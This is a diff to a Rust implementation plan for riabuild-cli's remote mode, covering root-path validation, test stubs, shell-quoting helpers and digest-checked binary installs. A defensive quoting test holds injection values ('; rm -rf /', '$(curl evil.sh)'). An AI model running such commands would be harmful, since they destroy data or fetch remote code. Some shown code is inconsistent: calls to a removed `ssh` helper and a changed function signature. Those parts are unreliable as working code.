@@ -22,6 +22,17 @@
 - **The version comes from the git tag.** Never `CARGO_PKG_VERSION`; local builds report `9999.0.0-dev`.
 - **`/api/v1` fields are added, never removed or retyped.** The one break this plan makes — a required `memberId` — is argued in the spec and is safe only because riabuild-web deploys before a CLI release ships.
 - **Every file stays under roughly 300 lines.** One responsibility per file.
+- **`pub` does not silence `dead_code` in a binary crate.** Stage B adds items whose first
+  real caller is in Stage C — `ScopedRunner`, the `download` asset helpers,
+  `paths::remote_namespace`, `remote_project_dir`. Each one gets
+  `#[allow(dead_code)] // consumed by Task N` until its consumer lands, and the `allow` comes
+  off in that task. Without this, every Stage B task fails the
+  `cargo clippy --all-targets -- -D warnings` gate the plan itself mandates, and Stage B is a
+  standalone pull request.
+- **A helper with no non-test caller is a bug, not a convenience.** If a task adds a function
+  and no later task calls it, either wire it in or do not add it. Two names for one concept
+  is the same bug: `paths::remote_namespace` and a second `namespace()` in `remote/session.rs`
+  must not both exist.
 - **Every PR runs** `cargo fmt --all`, `cargo clippy --all-targets -- -D warnings`, `cargo test` for the CLI, and `pnpm test` + `pnpm lint` for the web app. Work is not finished until PR CI has completed.
 - **Naming:** the user-facing name is **remote mode**; SSH is the transport, never the feature name.
 
@@ -892,18 +903,30 @@ fn the_root_override_is_read_without_touching_the_environment() {
     // Pure, so the decision is testable without setting a process-wide variable
     // every other test in this binary would then see.
     let home = Path::new("/home/dev");
-    assert_eq!(root_for(home, None), PathBuf::from("/home/dev/.riabuild"));
+    assert_eq!(root_for(home, None).expect("no override"), PathBuf::from("/home/dev/.riabuild"));
     assert_eq!(
-        root_for(home, Some("/home/dev/.riabuild-remote/abc")),
+        root_for(home, Some("/home/dev/.riabuild-remote/abc")).expect("absolute"),
         PathBuf::from("/home/dev/.riabuild-remote/abc")
     );
-    // A relative or empty override is ignored rather than obeyed: it would put a
-    // developer's state wherever the process happened to be standing.
-    assert_eq!(root_for(home, Some("")), PathBuf::from("/home/dev/.riabuild"));
-    assert_eq!(
-        root_for(home, Some("relative/path")),
-        PathBuf::from("/home/dev/.riabuild")
-    );
+}
+
+#[test]
+fn a_root_override_that_is_not_absolute_stops_rather_than_defaulting() {
+    // The catastrophic case, and the reason this is an error and not a
+    // fallback. `RIABUILD_ROOT` is set by the laptop when it provisions a
+    // server. If it arrives unusable — an unexpanded `~`, an empty string —
+    // defaulting to `~/.riabuild` puts *every* developer on that box in one
+    // namespace: one session.token, so a candidate's riabuild brokers Infisical
+    // at a lead's role, and one gh configuration, which is the silent
+    // wrong-identity bug the whole design exists to prevent.
+    let home = Path::new("/home/dev");
+    for bad in ["", "relative/path", "~/.riabuild-remote/abc"] {
+        let error = root_for(home, Some(bad)).expect_err(bad);
+        assert!(
+            error.to_string().contains("RIABUILD_ROOT"),
+            "{bad:?} produced {error}"
+        );
+    }
 }
 ```
 
@@ -971,7 +994,7 @@ impl RealPaths {
         let home = dirs::home_dir().ok_or_else(|| {
             anyhow::anyhow!("riabuild could not work out your home directory (is $HOME set?)")
         })?;
-        let root = root_for(&home, std::env::var("RIABUILD_ROOT").ok().as_deref());
+        let root = root_for(&home, std::env::var("RIABUILD_ROOT").ok().as_deref())?;
         Ok(Self { home, root })
     }
 
@@ -1011,13 +1034,24 @@ And two free functions:
 /// Where riabuild keeps this developer's state.
 ///
 /// Split out and pure so the decision is testable without setting an environment
-/// variable every other test in the binary would then see. A relative override is
-/// ignored: it would put state wherever the process happened to be standing,
-/// which is never what anyone meant.
-pub fn root_for(home: &Path, override_root: Option<&str>) -> PathBuf {
+/// variable every other test in the binary would then see.
+///
+/// An override that is not absolute is an **error**, never a fallback. It is set
+/// by a laptop provisioning a server, and if it arrives unusable, defaulting to
+/// `~/.riabuild` would put every developer on that box in one namespace —
+/// sharing one session token, and therefore brokering secrets at each other's
+/// role. Failing loudly is the only safe direction.
+pub fn root_for(home: &Path, override_root: Option<&str>) -> anyhow::Result<PathBuf> {
     match override_root {
-        Some(path) if Path::new(path).is_absolute() => PathBuf::from(path),
-        _ => home.join(".riabuild"),
+        None => Ok(home.join(".riabuild")),
+        Some(path) if Path::new(path).is_absolute() => Ok(PathBuf::from(path)),
+        Some(path) => Err(Failure::new(
+            "working out where riabuild keeps your files",
+            "Run `riabuild remote <server>` from your laptop again — it sets this, and it \
+             has set it wrong.",
+        )
+        .detail(format!("RIABUILD_ROOT={path:?} is not an absolute path"))
+        .into()),
     }
 }
 
@@ -1200,7 +1234,71 @@ mod tests {
 Run: `cd riabuild-cli && cargo test runner::`
 Expected: FAIL — `ScopedRunner` and `env_of` do not exist.
 
-- [ ] **Step 3: Record the environment in `FakeRunner`**
+- [ ] **Step 3: Give `FakeRunner` a matcher that can see the end of a command**
+
+Every remote invocation looks like `ssh <options…> ada@host <the command>`, so the part that
+distinguishes `uname -sm` from `<path> --version` from `command -v mosh-server` is the
+**last** argument. `FakeRunner::stubbed` matches prefixes only, so Tasks 17, 20, 21 and 22
+cannot script those apart — and a prefix stub on `"ssh"` silently answers all of them, which
+is how a test passes while exercising nothing.
+
+Add a substring matcher beside the prefix one, longest match winning, and prefer it when both
+hit:
+
+```rust
+    /// Stubs on a fragment appearing anywhere in the invocation, for commands
+    /// whose distinguishing part is not at the front — `ssh … host uname -sm`.
+    pub fn containing(mut self, fragment: &str, code: i32, stdout: &str, stderr: &str) -> Self {
+        self.contains.push((
+            fragment.to_string(),
+            CommandOutput {
+                code: Some(code),
+                stdout: stdout.to_string(),
+                stderr: stderr.to_string(),
+            },
+        ));
+        let program = fragment.split_whitespace().next().unwrap_or_default();
+        if !program.is_empty() && !self.available.iter().any(|p| p == program) {
+            self.available.push(program.to_string());
+        }
+        self
+    }
+```
+
+with `contains: Vec<(String, CommandOutput)>` on the struct, and `stubbed` consulting it
+after the prefix map, taking the longest matching fragment:
+
+```rust
+        let by_fragment = self
+            .contains
+            .iter()
+            .filter(|(fragment, _)| invocation.contains(fragment.as_str()))
+            .max_by_key(|(fragment, _)| fragment.len());
+        if let Some((fragment, output)) = by_fragment
+            && best.map(|(key, _)| fragment.len() > key.len()).unwrap_or(true)
+        {
+            return Some(output.clone());
+        }
+```
+
+Add a test that a fragment beats a shorter prefix:
+
+```rust
+#[tokio::test]
+async fn a_fragment_stub_can_answer_for_the_end_of_a_command() {
+    let fake = FakeRunner::new()
+        .with("ssh", 1, "", "unmatched")
+        .containing("uname -sm", 0, "Linux x86_64\n", "");
+
+    let output = fake
+        .run("ssh", &["-p", "22", "ada@box", "uname -sm"], &RunOptions::default())
+        .await
+        .expect("runs");
+    assert_eq!(output.trimmed(), "Linux x86_64");
+}
+```
+
+- [ ] **Step 4: Record the environment in `FakeRunner`**
 
 Add to the `FakeRunner` struct:
 
@@ -1235,7 +1333,7 @@ Add the accessor:
     }
 ```
 
-- [ ] **Step 4: Write `ScopedRunner`**
+- [ ] **Step 5: Write `ScopedRunner`**
 
 At the end of `runner.rs`, before the test module:
 
@@ -1298,12 +1396,12 @@ impl CommandRunner for ScopedRunner {
 
 Add `use std::sync::Arc;` to the imports at the top of the file.
 
-- [ ] **Step 5: Run the tests to verify they pass**
+- [ ] **Step 6: Run the tests to verify they pass**
 
 Run: `cd riabuild-cli && cargo test`
 Expected: PASS.
 
-- [ ] **Step 6: Commit**
+- [ ] **Step 7: Commit**
 
 ```bash
 cd riabuild-cli && cargo fmt --all && cargo clippy --all-targets -- -D warnings
@@ -2290,6 +2388,197 @@ git add riabuild-cli/src
 git commit -m "Name a server, hash it, and remember it"
 ```
 
+### Task 13b: Building a command the server will actually run
+
+**Files:**
+- Modify: `riabuild-cli/src/remote/mod.rs`
+- Modify: `riabuild-cli/src/remote/store.rs` (`Record.home`)
+- Test: `riabuild-cli/src/remote/mod.rs` tests module
+
+**Interfaces:**
+- Consumes: `identity::ssh_options` (Task 15 — declare the function here, wire it there).
+- Produces:
+  - `remote::shell_quote(value: &str) -> String`
+  - `remote::shell_command(script: &str) -> String` — wraps in `/bin/sh -c '…'`
+  - `remote::env_command(env: &[(&str, &str)], program: &str, args: &[&str]) -> String`
+  - `remote::ssh_once(remote, paths, runner, command) -> Result<CommandOutput>`
+  - `remote::resolve_home(remote, paths, runner, store) -> Result<String>` — cached in `remotes.json`
+
+Everything the server runs goes through these. Three things they exist to prevent:
+
+1. **`sshd` runs a remote command with the user's login shell.** riabuild supports fish
+   (`shell/fish.rs`), where `RIABUILD_ROOT=… riabuild` is a syntax error rather than an
+   assignment; csh differs again. Nothing riabuild sends may depend on POSIX syntax.
+2. **A `~` is expanded by a shell, and mosh has none** — it `execvp`s the command. An
+   unexpanded `~` then reaches `root_for`, which now refuses it (Task 6) rather than
+   silently sharing one namespace.
+3. **Values from the database reach a command line.** `latestCliVersion` is a Convex field,
+   and an unquoted one in `ssh host "…"` is exactly the remote-execution channel the root
+   `CLAUDE.md` calls load-bearing.
+
+- [ ] **Step 1: Write the failing tests**
+
+```rust
+#[test]
+fn quoting_makes_a_hostile_value_inert() {
+    assert_eq!(shell_quote("plain"), "'plain'");
+    assert_eq!(shell_quote("with space"), "'with space'");
+    // The one character that ends a single-quoted string, and the reason this
+    // is a function rather than a format string at each call site.
+    assert_eq!(shell_quote("it's"), r"'it'\''s'");
+    assert_eq!(shell_quote("; rm -rf /"), "'; rm -rf /'");
+    assert_eq!(shell_quote("$(curl evil.sh)"), "'$(curl evil.sh)'");
+    assert_eq!(shell_quote("a\nb"), "'a\nb'");
+}
+
+#[test]
+fn a_command_never_depends_on_the_login_shell() {
+    // fish would reject a `VAR=x cmd` prefix outright, and mosh runs the command
+    // with no shell at all, so `env` does the work instead.
+    let command = env_command(
+        &[("RIABUILD_ROOT", "/home/dev/.riabuild-remote/abc"), ("RIABUILD_REMOTE", "build-01")],
+        "/home/dev/.riabuild/riabuild/2026.08.06/riabuild",
+        &["--no-shell"],
+    );
+    assert!(command.starts_with("env "), "{command}");
+    assert!(command.contains("'RIABUILD_ROOT=/home/dev/.riabuild-remote/abc'"), "{command}");
+    assert!(!command.contains('~'), "{command}");
+
+    // Multi-step scripts say which shell runs them.
+    let script = shell_command("mkdir -p /tmp/x && cat > /tmp/x/y");
+    assert!(script.starts_with("/bin/sh -c '"), "{script}");
+}
+
+#[tokio::test]
+async fn the_servers_home_is_asked_for_once_and_remembered() {
+    let home = tempfile::TempDir::new().expect("tempdir");
+    let paths = crate::paths::RealPaths::rooted_at(home.path());
+    let fake = Arc::new(FakeRunner::new().containing("printf", 0, "/home/dev\n", ""));
+    let mut store = store::Store::default();
+    store.remotes.push(record_for(&remote()));
+
+    let first = resolve_home(&remote(), &paths, fake.clone(), &mut store).await.expect("asks");
+    assert_eq!(first, "/home/dev");
+    assert_eq!(store.remotes[0].home, "/home/dev");
+
+    let second = resolve_home(&remote(), &paths, fake.clone(), &mut store).await.expect("cached");
+    assert_eq!(second, "/home/dev");
+    assert_eq!(
+        fake.calls().iter().filter(|call| call.contains("printf")).count(),
+        1,
+        "the second call must come from remotes.json"
+    );
+}
+```
+
+Add a shared `record_for(remote: &Remote) -> store::Record` test helper in `store.rs` and use
+it from every remote test module — Tasks 13b, 17, 20, 21 and 22 all need one, and three
+copies is how they drift.
+
+- [ ] **Step 2: Run the tests to verify they fail**
+
+Run: `cd riabuild-cli && cargo test remote::`
+Expected: FAIL — none of the four functions exist.
+
+- [ ] **Step 3: Implement**
+
+```rust
+/// Single-quotes a value for a POSIX shell. The same rule `main.rs` already uses
+/// for `riabuild env`.
+pub fn shell_quote(value: &str) -> String {
+    format!("'{}'", value.replace('\'', r"'\''"))
+}
+
+/// Wraps a multi-step script so it is run by `/bin/sh`, whatever the account's
+/// login shell happens to be.
+pub fn shell_command(script: &str) -> String {
+    format!("/bin/sh -c {}", shell_quote(script))
+}
+
+/// `env K=V … program args…`, with every part quoted. No shell syntax at all,
+/// so this survives fish, csh, and mosh's shell-less exec alike.
+pub fn env_command(env: &[(&str, &str)], program: &str, args: &[&str]) -> String {
+    let mut parts = vec!["env".to_string()];
+    for (key, value) in env {
+        parts.push(shell_quote(&format!("{key}={value}")));
+    }
+    parts.push(shell_quote(program));
+    parts.extend(args.iter().map(|arg| shell_quote(arg)));
+    parts.join(" ")
+}
+
+/// One command on the server, through the key riabuild owns.
+pub async fn ssh_once(
+    remote: &Remote,
+    paths: &dyn Paths,
+    runner: Arc<dyn CommandRunner>,
+    command: &str,
+) -> Result<crate::runner::CommandOutput> {
+    let mut args = identity::ssh_options(remote, paths, true);
+    args.push(remote.target());
+    args.push(command.to_string());
+    let refs: Vec<&str> = args.iter().map(String::as_str).collect();
+    runner.run("ssh", &refs, &RunOptions::default()).await
+}
+
+/// The server's home directory, asked for once and kept in `remotes.json`.
+///
+/// Everything after this uses absolute paths, because a `~` is only a home
+/// directory to a shell that chose to expand it.
+pub async fn resolve_home(
+    remote: &Remote,
+    paths: &dyn Paths,
+    runner: Arc<dyn CommandRunner>,
+    store: &mut store::Store,
+) -> Result<String> {
+    if let Some(record) = store.find(&remote.name)
+        && !record.home.is_empty()
+    {
+        return Ok(record.home.clone());
+    }
+
+    let output = ssh_once(
+        remote,
+        paths,
+        runner,
+        &shell_command("printf %s \"$HOME\""),
+    )
+    .await?;
+    let home = output.trimmed().to_string();
+    if !output.ok() || !home.starts_with('/') {
+        return Err(Failure::new(
+            format!("asking {} where your home directory is", remote.host),
+            "Check that you can `ssh` to that server yourself, then run `riabuild remote` again.",
+        )
+        .detail(output.stderr)
+        .into());
+    }
+
+    if let Some(record) = store.remotes.iter_mut().find(|r| r.name == remote.name) {
+        record.home = home.clone();
+    }
+    store.save(paths).await?;
+    Ok(home)
+}
+```
+
+Add `home: String` to `store::Record` with `#[serde(default)]`, and give `Record` and `Store`
+`#[serde(rename_all = "camelCase")]` so the file matches the shape the design documents
+(`addedAt`, `lastUsedAt`, `sessionExpiresAt`, `lastSeenCliVersion`) rather than snake_case.
+
+- [ ] **Step 4: Run the tests to verify they pass**
+
+Run: `cd riabuild-cli && cargo test remote::`
+Expected: PASS.
+
+- [ ] **Step 5: Commit**
+
+```bash
+cd riabuild-cli && cargo fmt --all && cargo clippy --all-targets -- -D warnings
+git add riabuild-cli/src/remote
+git commit -m "Build remote commands no login shell has to understand"
+```
+
 ### Task 14: The `remote` subcommand
 
 **Files:**
@@ -3085,22 +3374,21 @@ use crate::ui::{Failure, Ui};
 use anyhow::Result;
 use std::sync::Arc;
 
-pub fn remote_binary_path(version: &str) -> String {
-    format!("~/.riabuild/riabuild/{version}/riabuild")
+/// Absolute, because nothing riabuild sends is parsed by a shell that would
+/// expand a `~` — see `remote::ssh_once` and the design's *How a command reaches
+/// the server*.
+pub fn remote_binary_path(home: &str, version: &str) -> String {
+    format!("{home}/.riabuild/riabuild/{version}/riabuild")
 }
 
-/// Runs one command on the server through the key riabuild owns.
-async fn ssh(
-    remote: &Remote,
-    paths: &dyn Paths,
-    runner: &Arc<dyn CommandRunner>,
-    command: &str,
-) -> Result<crate::runner::CommandOutput> {
-    let mut args = identity::ssh_options(remote, paths, true);
-    args.push(remote.target());
-    args.push(command.to_string());
-    let refs: Vec<&str> = args.iter().map(String::as_str).collect();
-    runner.run("ssh", &refs, &RunOptions::default()).await
+/// `sha256sum` on Linux, `shasum -a 256` on macOS; whichever exists prints the
+/// digest as its first word.
+fn digest_command(path: &str) -> String {
+    shell_command(&format!(
+        "if command -v sha256sum >/dev/null 2>&1; then sha256sum {q}; \
+         else shasum -a 256 {q}; fi | cut -d' ' -f1",
+        q = shell_quote(path)
+    ))
 }
 
 pub async fn ensure_riabuild(
@@ -3112,8 +3400,13 @@ pub async fn ensure_riabuild(
 ) -> Result<String> {
     let path = remote_binary_path(version);
 
-    let installed = ssh(remote, paths, &runner, &format!("{path} --version")).await?;
-    if installed.ok() && installed.trimmed().contains(version) {
+    // Trusted by digest, never by the version it claims. A co-tenant can put a
+    // script at this path that prints any version string it likes, and every
+    // other developer on a shared account would then execute it with their
+    // session token in the environment. `sha256sum`/`shasum` is asked for the
+    // digest of what is actually there.
+    let installed = ssh(remote, paths, &runner, &digest_command(&path)).await?;
+    if installed.ok() && installed.trimmed() == expected_digest {
         return Ok(path);
     }
 
@@ -3160,13 +3453,16 @@ pub async fn ensure_riabuild(
     let binary = download::extract_single_file(&tarball, "riabuild")?;
 
     // Written to a temporary name and moved into place, so a concurrent reader
-    // sees a complete binary or none. Two developers installing at once is an
-    // ordinary situation on a shared box.
-    let dir = format!("~/.riabuild/riabuild/{version}");
-    let install = format!(
-        "umask 077 && mkdir -p {dir} && cat > {dir}/.riabuild.part && \
-         chmod 755 {dir}/.riabuild.part && mv {dir}/.riabuild.part {dir}/riabuild"
-    );
+    // sees a complete binary or none. The name carries this process's pid: a
+    // fixed `.part` would have two developers installing the same version at the
+    // same moment write into one file and rename the interleaved result into
+    // place, and that race is the ordinary case on a shared box, not the
+    // exotic one.
+    let dir = format!("{home}/.riabuild/riabuild/{version}");
+    let part = format!("{dir}/.riabuild.{}.part", std::process::id());
+    let install = shell_command(&format!(
+        "umask 077 && mkdir -p {dir} && cat > {part} && chmod 755 {part} && mv {part} {dir}/riabuild"
+    ));
     let mut args = identity::ssh_options(remote, paths, true);
     args.push(remote.target());
     args.push(install);
@@ -3183,8 +3479,8 @@ pub async fn ensure_riabuild(
         .into());
     }
 
-    let confirmed = ssh(remote, paths, &runner, &format!("{path} --version")).await?;
-    if !confirmed.ok() || !confirmed.trimmed().contains(version) {
+    let confirmed = ssh(remote, paths, &runner, &digest_command(&path)).await?;
+    if !confirmed.ok() || confirmed.trimmed() != expected_digest {
         return Err(Failure::new(
             format!("installing riabuild on {}", remote.host),
             "Run `riabuild remote` again. If it keeps failing, tell your team lead.",
